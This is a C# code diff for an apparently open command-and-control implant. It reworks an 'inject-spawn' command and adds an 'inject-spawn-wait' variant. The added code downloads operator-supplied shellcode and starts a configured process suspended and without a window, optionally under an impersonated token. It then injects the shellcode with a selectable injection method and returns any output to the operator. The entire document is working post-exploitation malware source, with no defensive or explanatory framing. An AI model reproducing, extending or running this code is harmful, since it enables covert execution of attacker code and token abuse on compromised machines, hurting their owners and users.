@@ -1,4 +1,4 @@
-﻿using Agent.Internal;
+﻿using Agent.Helpers;
 using Agent.Models;
 using System;
 using System.Collections.Generic;
@@ -7,6 +7,7 @@ using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
+using WinAPI.Wrapper;
 
 namespace Agent.Commands
 {
@@ -14,36 +15,58 @@ namespace Agent.Commands
     {
         public override string Name => "inject-spawn";
 
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
+        protected virtual bool RedirectOutput { get; set; } = false;
+
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
-            if (task.SplittedArgs.Length < 1)
+
+            this.CheckFileDownloaded(task, context);
+
+            var file = context.FileService.ConsumeDownloadedFile(task.FileId);
+            var shellcode = file.GetFileContent();
+
+            try
             {
-                result.Result = $"Usage: {this.Name}  Process_Name_To_Start";
+
+                var winAPI = WinAPIWrapper.CreateInstance(context.ConfigService.APIAccessType);
+
+                var creationParms = new ProcessCreationParameters()
+                {
+                    Application = context.ConfigService.SpawnToX64,
+                    RedirectOutput = this.RedirectOutput,
+                    CreateNoWindow = true,
+                    CreateSuspended = true,
+                    CurrentDirectory = Environment.CurrentDirectory
+                };
+
+                if (ImpersonationHelper.HasCurrentImpersonation)
+                    creationParms.Token = ImpersonationHelper.ImpersonatedToken;
+
+                var procResult = winAPI.CreateProcess(creationParms);
+
+                winAPI.Inject(procResult.ProcessHandle, procResult.ThreadHandle, shellcode, context.ConfigService.APIInjectionMethod);
+
+                if (creationParms.RedirectOutput)
+                    winAPI.ReadPipeToEnd(procResult.ProcessId, procResult.OutPipeHandle, output => context.AppendResult(output, false));
+                else
+                    context.AppendResult($"Injection succeed.");
+            }
+            catch (Exception ex)
+            {
+                context.Error($"Injection failed : {ex}");
                 return;
             }
 
-            var fileName = task.FileId;
-            var fileContent = commm.Download(task.FileId, a =>
-            {
-                result.Info = $"Downloading {fileName} ({a}%)";
-                commm.SendResult(result);
-            }).Result;
 
-            result.Result += $"Sehllcode size = {fileContent.Length}" + Environment.NewLine;
-
-            this.Notify(result, commm, $"{fileName} Downloaded");
-
-            var shellcode = fileContent;
-
-            var injectRes =  Injector.SpawnInjectWithOutput(fileContent, task.SplittedArgs[0]);
-            if(!injectRes.Succeed)
-                result.Result += $"Injection failed : {injectRes.Error}";
-            else
-            {
-                result.Result += $"Injection succeed!" + Environment.NewLine;
-                if (!string.IsNullOrEmpty(injectRes.Output))
-                    result.Result += injectRes.Output;
-            }
         }
+    }
+
+    public class SpawnWaitInjectCommand : SpawnInjectCommand
+    {
+        public override string Name => "inject-spawn-wait";
+
+        protected override bool RedirectOutput => true;
+
+     
     }
 }
